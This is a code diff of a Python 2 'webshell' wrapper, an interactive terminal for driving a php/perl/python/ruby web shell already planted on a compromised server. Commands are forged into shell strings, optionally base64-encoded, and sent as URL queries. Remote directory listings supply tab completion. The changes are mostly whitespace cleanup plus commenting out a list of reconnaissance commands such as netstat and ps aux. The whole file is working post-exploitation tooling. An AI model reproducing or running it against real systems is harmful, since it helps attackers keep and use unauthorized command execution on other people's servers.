@@ -1,15 +1,15 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 
-# Sometimes you get a php/perl/python/ruby shell on a server... 
-# Because typing again and again on the browser address bar is quite uneffective. 
+# Sometimes you get a php/perl/python/ruby shell on a server...
+# Because typing again and again on the browser address bar is quite uneffective.
 # This wrapper provides you with a way to wrap your address bar query into a nice web shell
 # Bash like completion is a must have
-# Colors are nice too. 
+# Colors are nice too.
 
 # TODO: command helper (tab + tab => ifconfig )
 # TODO: complete http/https support
-# TODO: add assymetrical shell encryption 
+# TODO: add assymetrical shell encryption
 # TODO: Check if metasploit has something similar
 
 import httplib2
@@ -26,12 +26,12 @@ from argparse import ArgumentParser
 
 #TODO: parse args
 
-helpers = [
-    "ifconfig",
-    "service",
-    "netstat -lntp",
-    "netstat -antp",
-    "ps aux"]
+# helpers = [
+#     "ifconfig",
+#     "service",
+#     "netstat -lntp",
+#     "netstat -antp",
+#     "ps aux"]
 
 # Used in forge_request
 extra_path = '/sbin:/usr/sbin'
@@ -80,36 +80,36 @@ class webshell(Cmd):
 			retcode = self.colorize(retcode,'green')
 		else:
 			retcode = self.colorize(retcode,'red')
-		
+
 		username = self.colorize(self.username, 'orange')
 		hostname = self.colorize(self.hostname,'blue')
-		curpath  = self.colorize(self.path, 'blue') 
+		curpath  = self.colorize(self.path, 'blue')
 		suffix   = self.colorize(self.prompt_suffix, 'green')
 
 		self.prompt = '{'+ retcode + '}' + username  + ':' + curpath + suffix + ' '
 		#self.prompt = '{'+ retcode + '}' + username + '@' + hostname + ':' + self.path + self.prompt_suffix + ' '
-	
+
 	def ask_server(self, request):
 		if self.enc == 'base64':
 			request = b64encode(request)
 		req = urllib.quote_plus(request)
-		resp, content = self.h.request(self.url + req , "GET")	
+		resp, content = self.h.request(self.url + req , "GET")
 		self.status = str(resp.status)
 		#ret = content
 		ret = content.strip()
 		if self.status != '200':
 			ret = '-'
 		return ret
-	
+
 	def precmd(self, line):
 		self.set_prompt()
 		return line
 
 	def postcmd(self, stop, line):
 		self.set_prompt()
-		if stop: 
+		if stop:
 			exit()
-	
+
 	def forge_request(self, path, cmd ):
 		req = "export PATH=$PATH:" + extra_path + "; cd " + path + ';' + cmd + " 2>&1;"
 		return req
@@ -131,19 +131,19 @@ class webshell(Cmd):
 			print 'dammit'
 
 
-	def completedefault(self, text, line, begidx, endidx): 
+	def completedefault(self, text, line, begidx, endidx):
 		args = line.split(' ')
 		call = args.pop(0)
 		(head, tail) = os.path.split(args[0])
 #		print '\nh:'+head
 #		print '\nt:'+tail
-	
+
 		if os.path.isabs(args[0]):
 			req = self.forge_request(head, 'ls -1A')
-			
+
 		elif self.path is '/' :
 			req = self.forge_request(self.path + head, 'ls -1A')
-		
+
 		else :
 			req = self.forge_request(self.path +'/'+ head, 'ls -1A')
 
@@ -151,19 +151,19 @@ class webshell(Cmd):
 		get  = resp.split('\n')
 		opts = [x for x in get if x.startswith(tail) ]
 		return opts
-	
+
 	def do_cd(self, arg):
-		if arg == '~' or arg == '': 
+		if arg == '~' or arg == '':
 			self.path = self.home
-		else:	
+		else:
 			npath = os.path.join(self.path, arg)
 			req = self.forge_request(self.path, '[ -d' + npath + ' ] || echo o')
 			ans = self.ask_server(req)
 			self.path = os.path.normpath(npath)
-			
+
 	def do_path(self, arg):
 		print self.path
-	
+
 	def preloop(self):
 		pass
 
@@ -182,7 +182,7 @@ class arg_parser:
 		# DELETE sys.argv (since everything has been parsed)
 		del sys.argv[1:]
 
-if __name__ == "__main__":		
+if __name__ == "__main__":
 	try:
 		params = arg_parser()
 
